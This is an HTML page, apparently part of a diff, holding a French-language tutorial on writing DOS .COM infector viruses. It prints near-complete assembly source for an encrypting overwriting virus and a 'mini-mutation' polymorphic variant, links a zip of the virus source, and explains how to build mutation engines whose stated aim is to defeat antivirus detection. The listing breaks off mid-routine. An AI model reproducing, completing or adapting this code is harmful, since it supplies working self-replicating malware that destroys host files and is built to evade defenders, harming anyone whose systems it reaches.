+                             <font color="#a6caf0">; le code du fichier hôte</font>
+
+  push ds                    <font color="#a6caf0"><u>; On sauvegarde le segment</u></font>
+  mov ds,byte [ds:6ch]       ;<font color="#ff00ff"> Pointe vers le segment ou se trouve le virus en crypté. </font> 
+  mov dx,0                   <font color="#a6caf0">; Offset 0</font>
+
+  int 21h                    <font color="#a6caf0">; Appel de l'interruption 21h du DOS pour</font>
+                             <font color="#a6caf0">; lancer la réécriture.</font>
+  pop ds                     <font color="#a6caf0">; on restaure le segment , sans quoi ... booom!</font>
+  mov ah,<a href="#3eh"><font color="#05fad6">3eh</font></a>                 <font color="#a6caf0">; Indique " Fermer le fichier infecté. "</font>
+  int 21h                    <font color="#a6caf0">; Ferme le fichier.</font>
+ 
+  mov ah,<a href="#4fh"><font color="#05fad6">4fh</font></a>                 <font color="#a6caf0">; Appel de la fonction 4Fh('search next')</font>
+                             <font color="#a6caf0">; qui permet de continuer la recherche des</font>
+                             <font color="#a6caf0">; fichiers .COM dans le répertoire courant.</font>
+  int 21h
+  jmp search_lp              <font color="#a6caf0">; Retourne au label 'search' pour continuer</font>
+                             <font color="#a6caf0">; la recherche.</font>
+
+done:
+  mov ah,<a href="#49h"><font color="#05fad6">49h</font></a>                 <font color="#a6caf0"><u>; Avant de sortir on va quand même liberer la</u></font>
+                             <font color="#a6caf0"><u>; mêmoire allouée :o)</u></font>
+  mov es,byte [ds:6ch]       <font color="#a6caf0">; Elle est la ...</font>
+  int 21h
+  ret                        <font color="#a6caf0">; Termine le programme.</font>
+
+<a name="crypter">crypt:
+</a> in ax,<a href="#p40h"><font color="#05fad6">40h</font></a>                   ;<font color="#ff00ff"> On prend le timer pour avoir un nombre 'aléatoire'</font>
+boucle:
+  mov bl,byte ptr [start+si]
+  xor bl,al                  ;<font color="#ff00ff"> Crypte BL avec la clef.</font>
+  mov byte ptr es:[si],bl    ;<font color="#ff00ff"> Puis met le dans la mêmoire allouée.</font>
+  inc si                     ;<font color="#ff00ff"> Déplace le pointeur.</font>
+loop boucle
+jmp <a href="#sortir_srypt"><font color="#fffbf0">sortie_crypt</font></a>
+
+COM_FILE db '*.com',0        <font color="#a6caf0">; Place la chaîne de caractère '*.com'</font>
+                             <font color="#a6caf0">; dans COM_FILE (COM_FILE="*.COM")</font>
+
+ender:                       <font color="#a6caf0">; Label qui sert à déterminer la taille</font>
+                             <font color="#a6caf0">; du virus.</font>
+
+end start                    <font color="#a6caf0">; Fin du code.</font>
+</font> 
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Code source de <a href="http://membres.lycos.fr/gatesbillou/virus/download/mini-134.zip"><font color="#ffffff">mini-134 </font><i><font color="#ff0000">évolution</font></i></a><br>
+<br>
+Voyons unpeu comment il fonctionne.<br>
+La partie décryptage est simple , et a déja été décrite <a href="#decrypt"><font color="#fffbf0">plus haut</font></a>.<br>
+<br>
+Les fonctions <a href="#4eh"><font color="#fffbf0">4Eh</font></a> <a href="#4fh"><font color="#fffbf0">4Fh</font></a> <a href="#3dh"><font color="#fffbf0">3Dh</font></a> <a href="#3eh"><font color="#fffbf0">3Eh</font></a> <a href="#40h"><font color="#fffbf0">40H</font></a> ont déja été décrites.<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">A)<font color="#00ff33">La fonction <a name="48h">48h</a>(Allocation de mémoire).</font>
+
+Paramètres d'entrée: AH=48h
+                     BX=Nombre de paragraphes 16-byte à allouer
+Renvoie :            C : Carry à 1 si echec
+                     AX=Segment mémoire alloué (Rappel : memoire [SEGMENT:offset])
+                     BX=Taille disponible (si taille demandée trop grande (Carry=1))
+
+
+B)<font color="#00ff33">La fonction <a name="49h">49h</a>(Libération de mémoire)</font>
+
+Paramêtres d'entrée: AH=49h
+                     BX=Segment du block alloué à libérer
+Renvoie: AL= 0 si ca s'est bien passé.
+
+C)<font color="#00ff33">La fonction <a name="4ah">4Ah</a>(Réajustement de la taille mémoire)</font>
+
+Paramêtres d'entrée: AH=4Ah
+                     ES=Bloque mémoire à modifier 
+                     BX=Nouvelle taille du bloque mémoire
+Renvoie :            C : Carry à 1 si echec
+                     AL=Code d'erreur si chec
+                     BX=Taille disponible (si taille demandée trop grande (Carry=1))
+
+<a name="timer">D)<font color="#00ff33"></font></a><font color="#00ff33"><a name="p40h">Port Entrée/Sortie 40h</a> - Impulsion système</font>
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Le timer 0 s'utilise pour la synchronisation du système.<br>
+En principe il est programmé pour le mode 3,fonctionnement en onde carrée périodique.<br>
+Le décompte est chargé sur 0, pour générer 18,2 impulsions par secondes.<br>
+<br>
+Reportez vous au livre "PC PROGRAMMATION SYSTEME" edition CAMPUSPRESS par Frank van Gilluwe.<br>
+<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><font color="#ffff00"><u>La procédure de copie :</u></font>
+
+copie:
+   mov bl,byte ptr [start+si]
+   cmp si,offset debut-100h  <font color="#a6caf0">; On est sur la clef ? (-100h car </font><a href="#PSP"><font color="#fffbf0">PSP</font></a><font color="#a6caf0"> en memoire)</font>
+   je crypt                  <font color="#a6caf0">; Oui , on est sur la clef, on va crypter ...</font>
+   mov byte ptr es:[si],bl   <font color="#a6caf0">; Non , on copie simplement.</font>
+   inc si                    <font color="#a6caf0">; Déplace le pointeur.</font>
+  loop copie
+  sortie_crypt:
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Dans cette boucle , on copie le virus dans le bloque mémoire allouée pointée par ES:[SI].<br>
+On compte le nombre de caractères , et quand on arrive à la fin de la
+routine de décryptage, on continue à copier le virus , mais en le
+cryptant avec la procédure suivante :<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">crypt:
+ in ax,<a href="#p40h"><font color="#05fad6">40h</font></a>                   <font color="#a6caf0">; On prend le timer pour avoir un nombre 'aléatoire'</font>
+boucle:                      
+  mov bl,byte ptr [start+si]
+  xor bl,al                  <font color="#a6caf0">; Crypte BL avec la clef.</font>
+  mov byte ptr es:[si],bl    <font color="#a6caf0">; Puis met le dans la mêmoire allouée.</font>
+  inc si                     <font color="#a6caf0">; Déplace le pointeur.</font>
+loop boucle
+jmp sortie_crypt
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Puis on continue (avec la même clef de cryptage) à contaminer les autre fichiers .COM.<br>
+<br>
+L'instruction 'in ax,<a href="#p40h"><font color="#05fad6">40h</font></a>' sert à récupérer l'horloge système afin d'avoir une clé de cryptage 'aléatoire'.<br>
+On pourrait aussi utiliser la date , l'heure de création ou la taille
+du fichier comme clef de cryptage (uniquement si la taille ne change
+pas , of course).<br>
+Il peut aussi être intéressant de modifier la clef à chaque octets ou tous les N octets.<br>
+Ce virus peut être optimisé en taille et en vitesse. Il peut aussi être perfectionné avec l'ajout de procédure pour <a href="#garde_heure"><font color="#cfbbb1">conserver l'heure et la date de création</font></a>.<br>
+<br> 
+<a name="polymorphe"><font color="#ffff00"><b><u>Générateurs polymorphiques :</u></b></font></a><br>
+<br>
+<i><u>Généralement ils sont décomposées en trois parties :</u></i><br>
+<br>
+1) Le générateur de nombre aléatoire.<br>
+2) Le générateur de code 'inutile'.<br>
+3) Le generateur de décrypteur.<br>
+<br>
+Dans l'exemple précédent on a brouillé le corp du virus, d'accord ,
+mais il reste une toute petite partie qui ne change jamais , je veux
+parler de la partie décrypteur ...<br>
+<br>
+Ce qui est utile , c'est pas de 'brouiller' tout le code en modifiant
+son écriture et en ajoutant des instructions 'parasites', ce qu'il faut
+, c'est que la partie décryptage change d'aspect afin qu'il soit
+extrèmement difficile aux concepteurs d'antivirus de trouver une
+technique FIABLE pour détecter votre virus à 100% .<br>
+Il peut aussi être interessant d'améliorer le cryptage (là , je compte sur vous).<br>
+<br>
+Ma première expérience dans l'élaboration d'un virus polymorphe m'a
+éclairci rapidement les idées et ma fait voir la simplicité théorique
+ainsi que les difficultés techniques subtiles.<br>   
+<br>
+Le premier problème que l'on rencontre lorsque l'on insère du code à
+l'interieur d'un code pré-assemblé , c'est que les sauts , les boucles
+et les autre fonctions qui pointent quelque part dans le programme s'en
+trouvent faussés (décalés).<br>
+<br>
+Pour comprendre , voyons ce que ça donne avec un simple polymorphisme (Ajout de NOP) :<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><font color="#ffff00">Avant polymorphisme :</font>
+
+start:      
+ mov cx,[ender - debut]  
+ mov si,offset  debut    ; Pointe vers <font color="#00ff00">debut</font> (6 lignes de code plus bas).
+ mov ah,byte ptr [si]      
+ xor ah,90h
+ decrypt:
+   <font color="#0ba3f4">xor byte ptr [si],ah</font>  ; loop revient ici 
+   inc si
+loop decrypt             ; Retourne <font color="#0ba3f4">2 lignes de code plus haut</font>. 
+<font color="#00ff00">debut:
+  nop</font>
+  ...
+           
+<font color="#ffff00">Après polymorphisme :</font>
+
+start:      
+ mov cx,[ender - debut]
+ <font color="#c0c0c0">nop</font>  
+ mov si,offset  debut    ; Devrait pointer vers <font color="#00ff00">debut</font> (6 lignes de code plus bas).
+ <font color="#c0c0c0">nop</font>                        
+ mov ah,byte ptr [si]
+ <font color="#c0c0c0">nop</font>      
+ xor ah,90h
+ <font color="#c0c0c0">nop</font>
+ decrypt:
+   <font color="#00ff00">xor byte ptr [si],ah</font>  ; Ici , c'est plus 'debut' !  il se trouve plus bas maintenant.
+   <font color="#0ba3f4">nop</font>                   ; C'est pas non plus ici que doit revenir le loop !
+   inc si
+loop decrypt             ; Retourne <font color="#0ba3f4">2 lignes plus haut</font>. (normalement c'est sur 'xor byte ...'). 
+<font color="#c0c0c0">nop</font> 
+debut:
+  nop
+  ...
+</font></font></font></font></b></font></pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">		   
+<font color="#ff0000"><u>Toutes les adresses sont faussées ! Le programme plante.</u></font><br>
+<br>
+<font color="#c0c0c0"><i>En fait il fonctionne une fois.<br>
+Lors de la deuxième exécution il récupére une fausse clef, ce n'est pas
+grave ici car il ne tentera même pas de décrypter le code , à la place
+il ira dans une boucle inutile.<br>
+-&gt; Il fera NOP ; INC SI  ; NOP ; INC SI ; NOP ...   <img src="virus_com_data/joint02" alt="" border="0" height="23" width="24"><br>
+</i></font>
+<br>
+Surtout, rappelez-vous que votre programme est traduit en code machine
+, et que la longueur de ce code varie d'une instruction à l'autre.<br>
+<i><a href="#trap_opcode"><font color="#99ff99">Rappelez vous de l'exemple jouant avec cette particularité.</font></a></i><br>
+Il vous faut absolument la liste des équivalences INSTRUCTION&lt;&gt;OPCODE.<br>
+Pour cela je vous propose la <a href="http://membres.lycos.fr/gatesbillou/virus/download/x86%20opcode.pdf"><font color="#00ffff">documentation technique du processeur AMD-K6</font></a>.<br>
+Telechargez <a href="http://membres.lycos.fr/gatesbillou/virus/download/reader.exe"><font color="#6699ff">Acrobat Reader</font></a> (2.88 Mo).<br>
+Sans ce document il vous sera impossible de créer votre propre 'mutation engine'.<br>
+<br>
+Il faut donc penser ,lorsque qu'on ajoute du code, à modifier aussi les adresses des pointeurs.<br>
+<br>
+Afin de pallier ce problème il serait possible de préprogrammer
+plusieurs décrypteurs et d'en choisir un au hasard lors de la copie.<br>
+Le revers de la médaille , c'est qu'on reviendrait à un virus standard .<br>
+Il suffirait aux anti-virus d'identifier les quelques décrypteurs et le tour serait joué avec une fiabililté de 100%.<br>
+<br>
+Donc , pour remédier à ce problème de pointeur qui se fausse , il faut  utiliser le registre IP et la Pile.<br>
+<br>
+<u><font color="#d5dfff">Explication:</font></u><br>
+<br>
+ Lors d'un appel par un CALL , l'adresse de retour est stoquée dans la Pile.<br>
+ Pour récuperer cette adresse il suffit de faire un POP avec un registre au choix.<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><font color="#ffd4e2"><i>Exemple: </i></font>
+
+cs:100 call position             ; Stoque l'adresse en cours dans la pile (ici 100)
+ position:
+cs:103 pop di                    ; Met 100 dans DI
+cs:104 add di,[decrypt-position] ; Ajuste DI (on ne veut pas retourner en 100 mais en 107)
+ decrypt:
+cs:107 xor byte ptr [si],ah      ; La boucle commence ici
+cs:109 inc si                    ; On fait notre blabla ...
+cs:10A jmp di                    ; retourne en 107
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Attention ! ce code crée une boucle infinie entre 107 et 10A (Mettez une condition de sortie).<br>
+<br>
+Vous voyez bien ici comme la solution est simple si on comprend bien le fonctionnement des registres et de la pile.<br>
+<br>
+<font color="#66ccff"><u>Notre système de polymorphisme doit :</u></font><br>
+<br>
+ - modifier les instructions par d'autres instructions qui font la même chose.<br>
+ - Intervertir , si possible , les instructions entre elles.<br>
+ - Placer des instructions inutiles.<br>
+<br>
+Notre premier virus va fonctionner ainsi :<br>
+<br>
+ - Décryptage du corp du virus<br>
+ - Recherche d'un fichier à infecter<br>
+ - Création d'un décrypteur (polymorphe)<br>
+ - Infection<br>
+<br> Alors pour créer notre décrypteur on a besoin que le moteur de
+polymorphisme puisse fabriquer une infinité de variantes du décrypteur
+original.<br>
+Il piochera donc au hasard des fonctions ayant toutes une suite logique
+afin de reconstruire un décrypteur , sans oublier d'ajouter entre elles
+une nombre aléatoire d'instructions parasites/inutiles.<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><font color="#cc99ff">exemple :</font>
+             --&gt; peut s'écrire --&gt;
+		   
+                 			  mov ah,12h
+  					  mov al,34h
+					      <font color="#c0c0c0">OU</font>
+					  mov ah,34h
+					  mov al,12h
+					  xchg ah,al
+mov ax,1234h                                  <font color="#c0c0c0">OU</font>
+					  mov ax,1262h
+					  xor ax,56h
+				              <font color="#c0c0c0">OU</font>
+					  mov ax,091Ah
+					  shl ax,1
+					      <font color="#c0c0c0">ETC</font>
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Au plus notre moteur aura une vaste panoplie de fonctions , au plus notre virus sera polymorphe.<br>
+<br>
+<a name="inst_inutile">Il devra aussi y insérer un nombre aleatoire
+d'instructions inutiles (ce sera pour la deuxième version , on commence
+par un simple polymorphisme).<br></a>
+Pour ne pas 'bugger' notre virus il faudra que les instructions ajoutées n'influent absolument pas avec les code utile.<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">D'abord , on examine le décrypteur de base ....
+
+start:      
+ mov <font color="#cc99cc">cx</font>,[ender - debut]  
+ mov <font color="#99ccff">si</font>,offset  debut    
+ mov <font color="#99ffcc">ah</font>,byte ptr [<font color="#99ccff">si</font>]      
+ xor <font color="#99ffcc">ah</font>,90h
+ decrypt:
+   xor byte ptr [<font color="#99ccff">si</font>],<font color="#99ffcc">ah</font> 
+   inc <font color="#99ccff">si</font>
+loop decrypt             
+debut:
+  nop
+  ...
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><font color="#ff66ff"><i>Liste des registres utilisés :</i></font><br>
+<br>
+ <font color="#cc99cc">CX</font> : Registre utilisé pour la boucle. Compteur. Il ne faudra pas y toucher.<br>
+ <font color="#99ccff">SI</font> : Source Index. C'est le pointeur. Il ne faudra pas y toucher.<br>
+ <font color="#99ffcc">AH</font> : Clef de cryptage. Il ne faudra pas y toucher. <i>Mais on peut toucher à AL !</i><br>
+<br> 
+Nous pouvons donc toucher à tous les autres registre et en faire ce qu'on veut pour rendre illisible le code.<br>
+<br>
+On reprend de code ...<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><font color="#008000">start: </font>
+ mov al,12h     
+<font color="#008000"> mov cx,[ender - debut]</font>
+ mov bh,56
+ xor bh,bl
+ xchg bl,bh
+<font color="#008000"> mov si,offset  debut</font>
+ dec al
+ <font color="#008000">mov ah,byte ptr [si]</font>      
+ mov bx,56h
+ xor ah,90h
+ shl bx,5
+ add bh,ah
+<font color="#008000"> decrypt:</font>
+   out 2f8h,al
+   <font color="#008000">xor byte ptr [si],ah</font>  
+   stos
+   <font color="#008000">inc si</font>
+<font color="#008000">loop decrypt             
+debut:
+  nop
+  ...</font>
+</font></font></font></font></b></font></pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">
+Je crois qu'on peut dire qu'il a changé de tête et que ça commence à
+devenir dur de trouver une chaine d'identification fiable...<br>
+<br>
+<img src="virus_com_data/drweb.gif" border="0" height="110" width="133">
+<br>
+<br>
+<u>Mais voyons un peu le virus <font color="#ff0000">mini-mutation Beta</font> .</u>
+<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"> <font color="#00ffff">
+.model small  ; Definit le modèle de mémoire.
+.code         ; Début du code.
+
+FNAME EQU 9EH ; Nom du fichier résultant de la fonction de recherche.
+org 100h      ; Offset de chargement (emplacement mêmoire).
+
+start:        ; Ici on place un point appele 'start'.(=&gt; label start)
+
+ call uncrypt ; Comme son nom l'indique ...
+
+; Quand tout est decrypté on est ici.
+
+debut:
+  nop                        ; 90h sert de réference pour décrypter.
+  mov ah,4ah                 ; Demande une allocation mémoire
+  mov bx,[ender-start]       ; taille.
+  int 21h
+  mov ah,48h                 ; Allocation de mêmoire
+  int 21h                    ; Le Carry est &#8230; 1 si erreur (ici pas utilisé).
+  mov byte [ds:6ch],ax       ; Met l'adresse du segment allou&#8218; dans le PSP ,
+                             ; dans le File Control Block 2 
+  mov es,ax                  ; Pointe ES vers le segment allou&#8218;
+  mov cx,bx                  ; Initialise le compteur.
+  xor si,si                  ; Pointeur initialis&#8218; &#8230; 0.
+  copie:
+   mov bl,byte ptr [start+si]
+   cmp si,offset debut-100h  ; On est sur la clef ? (-100h car PSP en memoire)
+   je crypt                  ; Oui , on est sur la clef, on va crypter ...
+   mov byte ptr es:[si],bl   ; Non , on copie simplement.
+   inc si                    ; Déplace le pointeur.
+  loop copie
+  sortie_crypt:
+  <a href="#nouveau_decrypteur"><font color="#ffff00">call nouveau_decrypteur</font></a><font color="#ffff00"></font>    ; <font color="#09f7d2">Une fois le corp du virus crypté
+                             ; on fabrique un nouveau decrypteur.</font>
+
+  mov ah,4fh                 ;Appel de la fonction 4Fh('search next')
+                             ;qui permet de continuer la recherche des
+                             ;fichiers .COM dans le répertoire courant.
+  int 21h
+
+
+  mov ah,4eh                 ;Place la valeur 4Eh dans le registre AH
+                               ;(c'est la fonction de l'interruption 21h
+                             ;du DOS qui permet de chercher un fichier).
+			     ;Pour 4eh , le 'h' correspond à Hexadécimal.
+  mov dx,offset COM_FILE     ;Place dans DX la chaîne ASCII '*.com' définie
+                             ;plus bas qui permettra au DOS de chercher
+                             ;les fichiers .COM grâce à la fonction 4Eh.
+Int 21h                      ;Execute la recherche et formate un bloc de
+                             ;43 octets dans la DTA(Data Transfert Area)
+                             ;pour y placer le nom du fichier trouvé, sa
+                             ;position(pour savoir où continuer la recherche
+                             ;grâce à la fonction 'search next': 4Fh), ses
+                             ;attributs, la date et l'heure de sa dernière
+                             ;modification, et sa taille.
+
+				
+search_lp:
+  jc done                    ;Si aucun fichier n'est trouvé, aller au
+                             ;label 'done'.
+
+  mov ax,3d01h               ;Indique au DOS qu'on veut ouvrir le fichier qu'on a trouvé.
+  mov dx,fname               ;Pointeur vers le nom de fichier trouvé par
+                             ;la fonction de recherche 'search first'.
+  int 21h		     ;Lance l'interruption 21h.
+
+  xchg ax,bx                 ;Déplace de AX vers BX le numéro que le DOS
+                             ;a attribué à ce fichier pour l'identifier
+                             ;(le FILE HANDLE).
+
+  mov ah,40h                 ;Place la valeur 40h dans le registre AH
+                             ;(40h = Fonction du DOS qui permet d'écrire
+                             ;dans un fichier).
+
+  mov cx,[ender-start+50]    ;Réécrit le virus(compris entre le label
+                             ;'ender' et le label 'start') par dessus
+                             ;le code du fichier hôte
+
+  push ds                    ; On sauvegarde le segment
+  mov ds,byte [ds:6ch]
+  mov dx,0
+
+  int 21h                    ;Appel de l'interruption 21h du DOS pour
+                             ;lancer la réécriture.
+  pop ds                     ; on restaure le segment , sans quoi ... booom!
+  mov ah,3eh                 ;Indique " Fermer le fichier infecté. "
+  int 21h                    ;Ferme le fichier.
+ 
+  mov ah,4fh                 ;Appel de la fonction 4Fh('search next')
+                             ;qui permet de continuer la recherche des
+                             ;fichiers .COM dans le répertoire courant.
+  int 21h
+  jmp search_lp              ;Retourne au label 'search' pour continuer
+                             ;la recherche.
+
+done:
+  mov ah,49h                 ; Avant de sortir on va quand même liberer la
+                             ; mêmoire allouée :o)
+  mov es,byte [ds:6ch]       ; Elle est la ...
+  int 21h
+  ret                        ; Termine le programme.
+
+crypt:
+ in ax,40h                   ; On prend le timer pour avoir un nombre 'aléatoire'
+boucle:
+  mov bl,byte ptr [start+si]
+  xor bl,al                  ; Crypte BL avec la clef.
+  mov byte ptr es:[si],bl    ; Puis met le dans la mêmoire allouée.
+  inc si                     ; Déplace le pointeur.
+loop boucle
+jmp sortie_crypt
+
+<font color="#ff00ff">rand:</font>                        <font color="#a6caf0">; Generateur pseudo aleatoire permettant</font>
+<font color="#ff00ff"> in al,40h</font>                   <font color="#a6caf0">; de determiner quelle mutation choisir.</font>
+<font color="#ff00ff"> cmp al,55h</font>                  <font color="#a6caf0">; Il sort soit 1 soit 2 soit 3.</font>
+<font color="#ff00ff"> jb plus_de_55h</font>              
+<font color="#ff00ff"> mov cl,1 </font>                   <font color="#a6caf0">;  00  &gt;  85  &gt; 170</font>
+<font color="#ff00ff"> ret </font>                        <font color="#a6caf0">; cl=1   cl=2   cl=3</font>
+<font color="#ff00ff"> plus_de_55h:                
+ cmp al,0aah                 
+ jb plus_de_AAH</font>             
+<font color="#ff00ff"> mov cl,2</font>                    <font color="#a6caf0">; cl=2</font> 
+<font color="#ff00ff"> ret                         
+ plus_de_AAh:</font>               
+<font color="#ff00ff"> mov cl,3</font>                    <font color="#a6caf0">; cl=3</font> 
+<font color="#ff00ff"> ret
+ret</font>
+
+<a name="nouveau_decrypteur"><font color="#ffff00">nouveau_decrypteur:</font></a><font color="#ffff00">  <img src="virus_com_data/magicien" alt="" border="0" height="29" width="16"></font>
+
+ <font color="#ffff00">;----------------------------------------------------------------------------
+<a name="mov cx"> ;-                        MOV CX,XX (ajuster si modif)                      -</a>
+ ;----------------------------------------------------------------------------
+
+ call rand</font>                    ; chiffre 'aleatoire' entre 1 et 3
+ <font color="#ffff00">cmp cl,1</font>                     ; Si cl=1 utiliser 'MOV CL,1Ah'; 'MOV CH,03h'
+ <font color="#ffff00">je instr_01
+ cmp cl,2</font>
+ <font color="#ffff00">je instr_02</font>                  ; Si cl=2 utiliser 'MOV AX,xxh' ; 'XCGH AX,CX'
+ <font color="#ffff00">mov byte ptr es:[si],0B9h</font>    ; Sinon on utilise 'MOV CX,xxh'.
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],1Fh</font>     ; Taille du corp du virus. a ajuster si modif !
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],03h</font>     ;            "                 "
+ <font color="#ffff00">jmp suite_01
+ instr_01:
+ mov byte ptr es:[si],0B1h</font>    ; mov cl,xxh
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],1Fh</font>     ;    "  "
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],0B5h</font>    ; mov ch,xxh
+ <font color="#ffff00">inc si </font>                      ;    "  "
+ <font color="#ffff00">mov byte ptr es:[si],03h
+ jmp suite_01
+ instr_02:
+ mov byte ptr es:[si],0B8h</font>    ; mov ax,xxh
+ <font color="#ffff00">inc si                       
+ mov byte ptr es:[si],1Fh</font>     ;    "  "
+ <font color="#ffff00">inc si                       
+ mov byte ptr es:[si],03h</font>     ;    "  "
+ <font color="#ffff00">inc si                       
+ mov byte ptr es:[si],91h</font>     ; xchg ax,cx
+<font color="#ffff00">suite_01:
+ inc si
+
+ ;----------------------------------------------------------------------------
+ ;-                              MOV SI,0103h                                -
+ ;----------------------------------------------------------------------------
+
+ call rand
+ cmp cl,1
+ je instr_11</font>                  ; Si cl=1 utiliser "MOV SI,100h","ADD SI,0003h"
+ <font color="#ffff00">cmp cl,2
+ je instr_12</font>                  ; Si cl=2 utiliser "POP DI","MOV SI,DI","PUSH DI"
+ <font color="#ffff00">mov byte ptr es:[si],0BEh</font>    ; Sinon utiliser   "MOV SI,0103h"
+ <font color="#ffff00">inc si                       
+ mov byte ptr es:[si],03h</font>     ;    "  "
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],01h</font>     ;    "  "
+ <font color="#ffff00">jmp suite_02
+ instr_11:
+ mov byte ptr es:[si],0BEh</font>    ; mov si,100h
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],00h</font>     ;
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],01h</font>     ;
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],83h</font>     ; add si,0003h
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],0C6h
+ inc si
+ mov byte ptr es:[si],03h      
+ jmp suite_02
+ instr_12:
+ mov byte ptr es:[si],5Fh</font>      ; pop DI
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],8Bh</font>      ; mov si,di
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],0F7h
+ inc si
+ mov byte ptr es:[si],57h</font>      ; push DI
+<font color="#ffff00">suite_02:
+ inc si
+
+ ;----------------------------------------------------------------------------
+ ;-                           MOV AH,[SI]                                    -
+ ;----------------------------------------------------------------------------
+
+ call rand
+ cmp cl,1
+ je instr_21</font>                  ; Si cl=1 utiliser "mov al,[si]","XCHG AL,AH"
+ <font color="#ffff00">cmp cl,2
+ je instr_22</font>                  ; Si cl=2 "PUSH WORD PTR [SI]","POP BX","MOV AH,AL"
+ <font color="#ffff00">mov byte ptr es:[si],8Ah</font>     ; Sinon utiliser "MOV AH,[SI]"
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],24h     
+ jmp suite_03
+ instr_21:
+ mov byte ptr es:[si],8Ah</font>     ; mov al,[si]
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],04H</font>     ;    "  "
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],86H</font>     ; xchg al,ah
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],0C4H</font>    ;    "  "
+ <font color="#ffff00">jmp suite_03
+ instr_22:
+ mov byte ptr es:[si],0FFh</font>    ; push word ptr [si]
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],34H</font>     ;    "  "
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],5BH</font>     ; pop bx
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],8AH</font>     ; mov ah,bl
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],0E3H</font>    ;    "  "
+<font color="#ffff00">suite_03:
+ inc si
+
+ ;----------------------------------------------------------------------------
+ ;-                             XOR AH,90H                                   -
+ ;----------------------------------------------------------------------------
+
+ call rand
+ cmp cl,1
+ je instr_31
+ cmp cl,2
+ je instr_32
+ mov byte ptr es:[si],80h</font>     ; xor ah,90h
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],0F4h</font>    ;    "  "
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],90h</font>     ;    "  "
+ <font color="#ffff00">jmp suite_04
+ instr_31:
+ mov byte ptr es:[si],80h</font>     ; xor ah,90h (a modifier pour muta)
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],0F4h</font>    ;    "  "
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],90h</font>     ;    "  "
+ <font color="#ffff00">jmp suite_04
+ instr_32:
+ mov byte ptr es:[si],80h</font>     ; xor ah,90h (a modifier pour muta)
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],0F4h</font>    ;    "  "
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],90h</font>     ;    "  "
+<font color="#ffff00">suite_04:
+ inc si
+
+ ;----------------------------------------------------------------------------
+ ;-                           CALL -&gt; POP DI                                 -
+ ;----------------------------------------------------------------------------
+
+ call rand
+ cmp cl,1
+ je instr_41
+ cmp cl,2
+ je instr_42
+ mov byte ptr es:[si],0E8h</font>    ; call (décalage nul , pointe sur pop di)
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],00h</font>     ;    "   "
+ <font color="#ffff00">inc si                            
+ mov byte ptr es:[si],00h</font>     ;    "   "
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],5Fh</font>     ; le fameu POP DI (DI contient le registre IP)
+ <font color="#ffff00">jmp suite_05
